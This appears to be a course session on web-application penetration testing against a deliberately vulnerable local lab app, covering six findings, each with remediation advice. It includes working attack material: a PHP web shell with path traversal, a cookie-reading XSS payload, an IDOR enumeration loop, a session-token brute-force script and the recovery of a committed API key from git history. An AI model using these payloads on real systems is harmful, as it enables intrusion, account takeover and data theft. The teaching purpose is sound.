Session 4: The Web Application Grab Bag

Goal for this session: six findings that do not share a category but do share a theme, the application trusts something it should not. It trusts a URL parameter to name whose data you get. It trusts a filename. It trusts a stored string to be safe HTML. It trusts a token it made out of the clock. Two of these ZAP flags for you; four it does not.

4.1 Exposed .git Directory

A real git repository sits inside the web root at /admin/.git/. gobuster or ffuf against /admin/ finds it; ZAP's spider often will not, because it depends on wordlist coverage.

gobuster dir -u http://127.0.0.1:8080/admin/ -w <wordlist>
git-dumper http://127.0.0.1:8080/admin/.git/ ./loot
cd loot && git log -p | grep -i api_key

The working copy of config.php is clean, it reads the key from an environment variable. But the first commit put the key in cleartext, and the second commit only "moved it to the environment." The key is still in history:

WIDGETORIUM_API_KEY = 'wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d770f18'

The fix is two-part and both parts matter: never deploy .git into a web root, and rotate any secret that has ever been committed, because "we removed it" is not "it is gone."

4.2 IDOR on Order History

Order IDs are sequential from 1001, and orders.php?id= does not check that the order belongs to you.

for i in $(seq 1001 1030); do
  curl -s "http://127.0.0.1:8080/orders.php?id=$i" | grep -o 'Customer ID [0-9]*'
done

No login required. You are reading thirty customers' orders and line items by counting. ZAP sees a page that returns 200 and moves on; it has no idea the ID belongs to someone else. The fix is an ownership check, AND customer_id = <session user>, before the row is returned. Unpredictable IDs help but are not the fix.

4.3 Reflected and Stored XSS in Reviews

Reflected, on the search page:

http://127.0.0.1:8080/search.php?q=<script>alert(1)</script>

Stored, through the review form, which needs no login and encodes nothing:

curl -s -d "product_id=1&author=x&body=<script>alert(document.cookie)</script>" \
     http://127.0.0.1:8080/review.php

Load that product page and the script runs for every visitor. Because the session cookie is not HttpOnly (Session 4.5), document.cookie hands you the token. ZAP flags both variants on the active scan. The fix is output encoding at render time plus a Content-Security-Policy, and setting HttpOnly so a stray script cannot read the cookie.

4.4 Unrestricted Upload with Path Traversal

The "sell a widget" form takes an image with no extension check, no content-type check, and, if you supply the optional "save as" field, it uses that name verbatim. Files land under the web root where PHP executes.

printf '<?php echo "SH:".shell_exec($_GET["c"]);' > sh.php
curl -s -F 'image=@sh.php' http://127.0.0.1:8080/upload.php
curl -s 'http://127.0.0.1:8080/uploads/sh.php?c=id'          # SH:uid=33(www-data)...

Now the traversal. PHP strips the path from $_FILES['name'], but the plain filename form field is not sanitised:

curl -s -F 'image=@sh.php' -F 'filename=../trav.php' http://127.0.0.1:8080/upload.php
curl -s 'http://127.0.0.1:8080/trav.php?c=id'                # served one directory up

The fix: whitelist extensions, validate content server-side, basename() the name, store uploads outside the web root, and disable script execution in the upload directory. Any one of those alone is not enough; a real fix does several.

4.5 Predictable Session Tokens

Log in as two seed users about a second apart and compare the WIDGET_SESSID cookies. The structure is hex(unix_time) followed by a zero-padded hex(user_id). It is not PHP's session ID; the application rolled its own.

The token is validated against a sessions row, so the target needs an active session, but that is the whole attack: an administrator logs in (or you use the Session 2 auth bypass, which mints exactly this cookie for user ID 1), and from a fresh client you enumerate a few hundred hex(time) values around that login for user ID 0001 until one loads the admin account.

python3 - <<'PY'
import time, requests
uid = "0001"
for t in range(int(time.time())-400, int(time.time())+1):
    tok = f"{t:x}{uid}"
    r = requests.get("http://127.0.0.1:8080/account.php",
                     cookies={"WIDGET_SESSID": tok})
    if "admin" in r.text.lower():
        print("hit:", tok); break
PY

The fix is cryptographically random tokens, random_bytes, or simply using the platform session manager instead of inventing one. Running with WEAK_SESSIONS=0 takes the attack off the table.

4.6 Verbose Error Messages

curl -s "http://127.0.0.1:8080/search.php?q=%27"

The response contains the failing SQL string and a stack trace. That is the raw material for Sessions 2.1 and 2.3, it hands you table and column names. ZAP flags it as information disclosure on the passive scan. The fix is generic error pages in production, display_errors = Off, and detailed logging kept server-side where the attacker cannot read it.

4.7 What You Should Notice

Reflected XSS and verbose errors, the two a scanner catches here, are the two where the payload goes straight back in the response. The four it misses, the .git directory, the IDOR, the upload, the session token, all require the tester to hold a model of how the application should behave and notice where it does not. That model is the job. The scanner is an assistant.
